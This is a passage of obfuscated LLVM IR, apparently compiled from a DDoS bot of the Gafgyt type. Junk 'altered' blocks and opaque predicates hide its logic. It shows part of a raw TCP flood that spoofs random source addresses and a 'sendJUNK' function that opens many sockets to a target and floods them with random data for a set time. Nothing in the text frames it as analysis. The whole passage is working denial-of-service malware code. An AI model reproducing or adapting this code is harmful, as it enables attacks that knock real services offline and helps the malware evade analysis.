  %665 = load i16, i16* %664, align 4
  %_25 = sub i16 %665, -241
  %gen26 = mul i16 %_25, -241
  %_27 = sub i16 %665, -241
  %gen28 = mul i16 %_27, -241
  %_29 = sub i16 0, %665
  %gen30 = add i16 %_29, -241
  %_31 = shl i16 %665, -241
  %_32 = sub i16 %665, -241
  %gen33 = mul i16 %_32, -241
  %_34 = shl i16 %665, -241
  %_35 = sub i16 0, %665
  %gen36 = add i16 %_35, -241
  %_37 = shl i16 %665, -241
  %666 = and i16 %665, -241
  %_38 = shl i16 %666, 80
  %_39 = sub i16 %666, 80
  %gen40 = mul i16 %_39, 80
  %_41 = sub i16 %666, 80
  %gen42 = mul i16 %_41, 80
  %_43 = sub i16 %666, 80
  %gen44 = mul i16 %_43, 80
  %667 = or i16 %666, 80
  store i16 %667, i16* %664, align 4
  %668 = load i8*, i8** %20, align 8
  %669 = call i32 @strcmp(i8* %668, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.59, i32 0, i32 0)) #10
  %670 = icmp ne i32 %669, 0
  br label %originalBB10

originalBB48alteredBB:                            ; preds = %originalBB48, %219
  %671 = load i8*, i8** %20, align 8
  %672 = call i8* @strtok(i8* %671, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %672, i8** %31, align 8
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %265
  %673 = load i8*, i8** %31, align 8
  %674 = call i32 @strcmp(i8* %673, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.63, i32 0, i32 0)) #10
  %675 = icmp ne i32 %674, 0
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %293
  %676 = load i8*, i8** %31, align 8
  %677 = call i32 @strcmp(i8* %676, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %678 = icmp ne i32 %677, 0
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %321
  %679 = load i8*, i8** %31, align 8
  %680 = call i32 @strcmp(i8* %679, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0)) #10
  %681 = icmp ne i32 %680, 0
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %353
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %370
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %389
  %682 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %682, i8** %31, align 8
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %408
  %683 = call i32 @rand_cmwc()
  %684 = trunc i32 %683 to i16
  %685 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %686 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %685, i32 0, i32 0
  %687 = bitcast %union.anon.0* %686 to %struct.anon.1*
  %688 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %687, i32 0, i32 5
  store i16 %684, i16* %688, align 2
  %689 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %690 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %689, i32 0, i32 0
  %691 = bitcast %union.anon.0* %690 to %struct.anon.1*
  %692 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %691, i32 0, i32 6
  store i16 0, i16* %692, align 4
  %693 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %694 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %693, i32 0, i32 0
  %695 = bitcast %union.anon.0* %694 to %struct.anon.1*
  %696 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %695, i32 0, i32 7
  store i16 0, i16* %696, align 2
  %697 = load i32, i32* %17, align 4
  %698 = icmp eq i32 %697, 0
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %441
  %699 = call i32 @rand_cmwc()
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %490
  %700 = load i32, i32* %25, align 4
  %701 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %702 = call i64 @sendto(i32 %700, i8* %133, i64 %131, i32 0, %struct.sockaddr* %701, i32 16)
  %703 = load i32, i32* %27, align 4
  %704 = call i32 @getRandomIP(i32 %703)
  %705 = call i32 @htonl(i32 %704) #13
  %706 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %707 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %706, i32 0, i32 8
  store i32 %705, i32* %707, align 4
  %708 = call i32 @rand_cmwc()
  %709 = trunc i32 %708 to i16
  %710 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %711 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %710, i32 0, i32 3
  store i16 %709, i16* %711, align 4
  %712 = call i32 @rand_cmwc()
  %713 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %714 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %713, i32 0, i32 0
  %715 = bitcast %union.anon.0* %714 to %struct.anon.1*
  %716 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %715, i32 0, i32 2
  store i32 %712, i32* %716, align 4
  %717 = call i32 @rand_cmwc()
  %718 = trunc i32 %717 to i16
  %719 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %720 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %719, i32 0, i32 0
  %721 = bitcast %union.anon.0* %720 to %struct.anon.1*
  %722 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %721, i32 0, i32 0
  store i16 %718, i16* %722, align 4
  %723 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %724 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %723, i32 0, i32 0
  %725 = bitcast %union.anon.0* %724 to %struct.anon.1*
  %726 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %725, i32 0, i32 6
  store i16 0, i16* %726, align 4
  %727 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %728 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %729 = call zeroext i16 @tcpcsum(%struct.iphdr* %727, %struct.tcphdr* %728)
  %730 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %731 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %730, i32 0, i32 0
  %732 = bitcast %union.anon.0* %731 to %struct.anon.1*
  %733 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %732, i32 0, i32 6
  store i16 %729, i16* %733, align 4
  %734 = bitcast i8* %133 to i16*
  %735 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %736 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %735, i32 0, i32 2
  %737 = load i16, i16* %736, align 2
  %738 = zext i16 %737 to i32
  %739 = call zeroext i16 @csum(i16* %734, i32 %738)
  %740 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %741 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %740, i32 0, i32 7
  store i16 %739, i16* %741, align 2
  %742 = load i32, i32* %33, align 4
  %743 = load i32, i32* %23, align 4
  %744 = icmp eq i32 %742, %743
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %552
  %745 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %746 = load i32, i32* %32, align 4
  %747 = icmp sgt i32 %745, %746
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %579
  br label %originalBB92
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.75
  %5 = load i32, i32* @y.76
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.__sigset_t, align 8
  %20 = alloca %struct.timeval, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %28 = call i32 @getdtablesize() #2
  %29 = sdiv i32 %28, 2
  store i32 %29, i32* %15, align 4
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %13, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #13
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %12, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  %39 = load i32, i32* @x.75
  %40 = load i32, i32* @y.76
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %48

; <label>:47:                                     ; preds = %originalBBpart2
  br label %370

; <label>:48:                                     ; preds = %originalBBpart2
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %49, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 8, i32 4, i1 false)
  %51 = load i32, i32* %15, align 4
  %52 = zext i32 %51 to i64
  %53 = call i8* @llvm.stacksave()
  store i8* %53, i8** %18, align 8
  %54 = alloca %struct.state_t, i64 %52, align 16
  %55 = bitcast %struct.state_t* %54 to i8*
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = mul i64 %57, 5
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 %58, i32 16, i1 false)
  %59 = call noalias i8* @malloc(i64 1024) #2
  store i8* %59, i8** %24, align 8
  %60 = load i8*, i8** %24, align 8
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 1024, i32 1, i1 false)
  %61 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %62 = load i32, i32* %14, align 4
  %63 = add nsw i32 %61, %62
  store i32 %63, i32* %25, align 4
  br label %64

; <label>:64:                                     ; preds = %367, %48
  %65 = load i32, i32* %25, align 4
  %66 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %67 = icmp sgt i32 %65, %66
  br i1 %67, label %68, label %368

; <label>:68:                                     ; preds = %64
  store i32 0, i32* %16, align 4
  br label %69

; <label>:69:                                     ; preds = %364, %68
  %70 = load i32, i32* %16, align 4
  %71 = load i32, i32* %15, align 4
  %72 = icmp slt i32 %70, %71
  br i1 %72, label %73, label %367

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* %16, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %75
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %76, i32 0, i32 1
  %78 = load i8, i8* %77, align 4
  %79 = zext i8 %78 to i32
  switch i32 %79, label %347 [
    i32 0, label %80
    i32 1, label %156
    i32 2, label %273
  ]

; <label>:80:                                     ; preds = %73
  %81 = load i32, i32* @x.75
  %82 = load i32, i32* @y.76
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %80
  %89 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %90 = load i32, i32* %16, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %91
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %92, i32 0, i32 0
  store i32 %89, i32* %93, align 8
  %94 = load i32, i32* %16, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %95
  %97 = getelementptr inbounds %struct.state_t, %struct.state_t* %96, i32 0, i32 0
  %98 = load i32, i32* %97, align 8
  %99 = load i32, i32* %16, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %100
  %102 = getelementptr inbounds %struct.state_t, %struct.state_t* %101, i32 0, i32 0
  %103 = load i32, i32* %102, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %103, i32 3, i8* null)
  %105 = or i32 %104, 2048
  %106 = call i32 (i32, i32, ...) @fcntl(i32 %98, i32 4, i32 %105)
  %107 = load i32, i32* %16, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %108
  %110 = getelementptr inbounds %struct.state_t, %struct.state_t* %109, i32 0, i32 0
  %111 = load i32, i32* %110, align 8
  %112 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %113 = call i32 @connect(i32 %111, %struct.sockaddr* %112, i32 16)
  %114 = icmp ne i32 %113, -1
  %115 = load i32, i32* @x.75
  %116 = load i32, i32* @y.76
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart212, label %originalBB8alteredBB

originalBBpart212:                                ; preds = %originalBB8
  br i1 %114, label %127, label %123

; <label>:123:                                    ; preds = %originalBBpart212
  %124 = call i32* @__errno_location() #13
  %125 = load i32, i32* %124, align 4
  %126 = icmp ne i32 %125, 115
  br i1 %126, label %127, label %134

; <label>:127:                                    ; preds = %123, %originalBBpart212
  %128 = load i32, i32* %16, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %129
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = call i32 @close(i32 %132)
  br label %155

; <label>:134:                                    ; preds = %123
  %135 = load i32, i32* @x.75
  %136 = load i32, i32* @y.76
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %134
  %143 = load i32, i32* %16, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %144
  %146 = getelementptr inbounds %struct.state_t, %struct.state_t* %145, i32 0, i32 1
  store i8 1, i8* %146, align 4
  %147 = load i32, i32* @x.75
  %148 = load i32, i32* @y.76
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %155

; <label>:155:                                    ; preds = %originalBBpart216, %127
  br label %347

; <label>:156:                                    ; preds = %73
  br label %157

; <label>:157:                                    ; preds = %156
  %158 = load i32, i32* @x.75
  %159 = load i32, i32* @y.76
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %157
  %166 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %167 = getelementptr inbounds [16 x i64], [16 x i64]* %166, i64 0, i64 0
  %168 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %167) #2, !srcloc !6
  %169 = extractvalue { i64, i64* } %168, 0
  %170 = extractvalue { i64, i64* } %168, 1
  %171 = trunc i64 %169 to i32
  store i32 %171, i32* %26, align 4
  %172 = ptrtoint i64* %170 to i64
  %173 = trunc i64 %172 to i32
  store i32 %173, i32* %27, align 4
  %174 = load i32, i32* @x.75
  %175 = load i32, i32* @y.76
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %182

; <label>:182:                                    ; preds = %originalBBpart220
  br label %183

; <label>:183:                                    ; preds = %182
  %184 = load i32, i32* %16, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %185
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = srem i32 %188, 64
  %190 = zext i32 %189 to i64
  %191 = shl i64 1, %190
  %192 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %193 = load i32, i32* %16, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %194
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 8
  %198 = sdiv i32 %197, 64
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds [16 x i64], [16 x i64]* %192, i64 0, i64 %199
  %201 = load i64, i64* %200, align 8
  %202 = or i64 %201, %191
  store i64 %202, i64* %200, align 8
  %203 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 0
  store i64 0, i64* %203, align 8
  %204 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 1
  store i64 10000, i64* %204, align 8
  %205 = load i32, i32* %16, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %206
  %208 = getelementptr inbounds %struct.state_t, %struct.state_t* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 8
  %210 = add nsw i32 %209, 1
  %211 = call i32 @select(i32 %210, %struct.__sigset_t* null, %struct.__sigset_t* %19, %struct.__sigset_t* null, %struct.timeval* %20)
  store i32 %211, i32* %23, align 4
  %212 = load i32, i32* %23, align 4
  %213 = icmp eq i32 %212, 1
  br i1 %213, label %214, label %257

; <label>:214:                                    ; preds = %183
  store i32 4, i32* %21, align 4
  %215 = load i32, i32* %16, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %216
  %218 = getelementptr inbounds %struct.state_t, %struct.state_t* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 8
  %220 = bitcast i32* %22 to i8*
  %221 = call i32 @getsockopt(i32 %219, i32 1, i32 4, i8* %220, i32* %21) #2
  %222 = load i32, i32* %22, align 4
  %223 = icmp ne i32 %222, 0
  br i1 %223, label %224, label %235

; <label>:224:                                    ; preds = %214
  %225 = load i32, i32* %16, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %226
  %228 = getelementptr inbounds %struct.state_t, %struct.state_t* %227, i32 0, i32 0
  %229 = load i32, i32* %228, align 8
  %230 = call i32 @close(i32 %229)
  %231 = load i32, i32* %16, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %232
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %233, i32 0, i32 1
  store i8 0, i8* %234, align 4
  br label %240

; <label>:235:                                    ; preds = %214
  %236 = load i32, i32* %16, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %237
  %239 = getelementptr inbounds %struct.state_t, %struct.state_t* %238, i32 0, i32 1
  store i8 2, i8* %239, align 4
  br label %240

; <label>:240:                                    ; preds = %235, %224
  %241 = load i32, i32* @x.75
  %242 = load i32, i32* @y.76
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %240
  %249 = load i32, i32* @x.75
  %250 = load i32, i32* @y.76
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %272

; <label>:257:                                    ; preds = %183
  %258 = load i32, i32* %23, align 4
  %259 = icmp eq i32 %258, -1
  br i1 %259, label %260, label %271

; <label>:260:                                    ; preds = %257
  %261 = load i32, i32* %16, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %262
  %264 = getelementptr inbounds %struct.state_t, %struct.state_t* %263, i32 0, i32 0
  %265 = load i32, i32* %264, align 8
  %266 = call i32 @close(i32 %265)
  %267 = load i32, i32* %16, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %268
  %270 = getelementptr inbounds %struct.state_t, %struct.state_t* %269, i32 0, i32 1
  store i8 0, i8* %270, align 4
  br label %271

; <label>:271:                                    ; preds = %260, %257
  br label %272

; <label>:272:                                    ; preds = %271, %originalBBpart224
  br label %347

; <label>:273:                                    ; preds = %73
  %274 = load i32, i32* @x.75
  %275 = load i32, i32* @y.76
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %273
  %282 = load i8*, i8** %24, align 8
  call void @makeRandomStr(i8* %282, i32 1024)
  %283 = load i32, i32* %16, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %284
  %286 = getelementptr inbounds %struct.state_t, %struct.state_t* %285, i32 0, i32 0
  %287 = load i32, i32* %286, align 8
  %288 = load i8*, i8** %24, align 8
  %289 = call i64 @send(i32 %287, i8* %288, i64 1024, i32 16384)
  %290 = icmp eq i64 %289, -1
  %291 = load i32, i32* @x.75
  %292 = load i32, i32* @y.76
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %290, label %299, label %330

; <label>:299:                                    ; preds = %originalBBpart228
  %300 = load i32, i32* @x.75
  %301 = load i32, i32* @y.76
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %299
  %308 = call i32* @__errno_location() #13
  %309 = load i32, i32* %308, align 4
  %310 = icmp ne i32 %309, 11
  %311 = load i32, i32* @x.75
  %312 = load i32, i32* @y.76
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %310, label %319, label %330

; <label>:319:                                    ; preds = %originalBBpart232
  %320 = load i32, i32* %16, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %321
  %323 = getelementptr inbounds %struct.state_t, %struct.state_t* %322, i32 0, i32 0
  %324 = load i32, i32* %323, align 8
  %325 = call i32 @close(i32 %324)
  %326 = load i32, i32* %16, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %327
  %329 = getelementptr inbounds %struct.state_t, %struct.state_t* %328, i32 0, i32 1
  store i8 0, i8* %329, align 4
  br label %330

; <label>:330:                                    ; preds = %319, %originalBBpart232, %originalBBpart228
  %331 = load i32, i32* @x.75
  %332 = load i32, i32* @y.76
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %330
  %339 = load i32, i32* @x.75
  %340 = load i32, i32* @y.76
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %347

; <label>:347:                                    ; preds = %originalBBpart236, %272, %155, %73
  %348 = load i32, i32* @x.75
  %349 = load i32, i32* @y.76
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %347
  %356 = load i32, i32* @x.75
  %357 = load i32, i32* @y.76
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %364

; <label>:364:                                    ; preds = %originalBBpart240
  %365 = load i32, i32* %16, align 4
  %366 = add nsw i32 %365, 1
  store i32 %366, i32* %16, align 4
  br label %69

; <label>:367:                                    ; preds = %69
  br label %64

; <label>:368:                                    ; preds = %64
  %369 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %369)
  br label %370

; <label>:370:                                    ; preds = %368, %47
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %371 = alloca i8*, align 8
  %372 = alloca i32, align 4
  %373 = alloca i32, align 4
  %374 = alloca i32, align 4
  %375 = alloca i32, align 4
  %376 = alloca %struct.sockaddr_in, align 4
  %377 = alloca i8*, align 8
  %378 = alloca %struct.__sigset_t, align 8
  %379 = alloca %struct.timeval, align 8
  %380 = alloca i32, align 4
  %381 = alloca i32, align 4
  %382 = alloca i32, align 4
  %383 = alloca i8*, align 8
  %384 = alloca i32, align 4
  %385 = alloca i32, align 4
  %386 = alloca i32, align 4
  store i8* %0, i8** %371, align 8
  store i32 %1, i32* %372, align 4
  store i32 %2, i32* %373, align 4
  %387 = call i32 @getdtablesize() #2
  %_ = sub i32 0, %387
  %gen = add i32 %_, 2
  %_1 = sub i32 %387, 2
  %gen2 = mul i32 %_1, 2
  %_3 = shl i32 %387, 2
  %_4 = shl i32 %387, 2
  %_5 = shl i32 %387, 2
  %_6 = sub i32 %387, 2
  %gen7 = mul i32 %_6, 2
  %388 = sdiv i32 %387, 2
  store i32 %388, i32* %374, align 4
  %389 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %376, i32 0, i32 0
  store i16 2, i16* %389, align 4
  %390 = load i32, i32* %372, align 4
  %391 = trunc i32 %390 to i16
  %392 = call zeroext i16 @htons(i16 zeroext %391) #13
  %393 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %376, i32 0, i32 1
  store i16 %392, i16* %393, align 2
  %394 = load i8*, i8** %371, align 8
  %395 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %376, i32 0, i32 2
  %396 = call i32 @getHost(i8* %394, %struct.in_addr* %395)
  %397 = icmp ne i32 %396, 0
  br label %originalBB

originalBB8alteredBB:                             ; preds = %originalBB8, %80
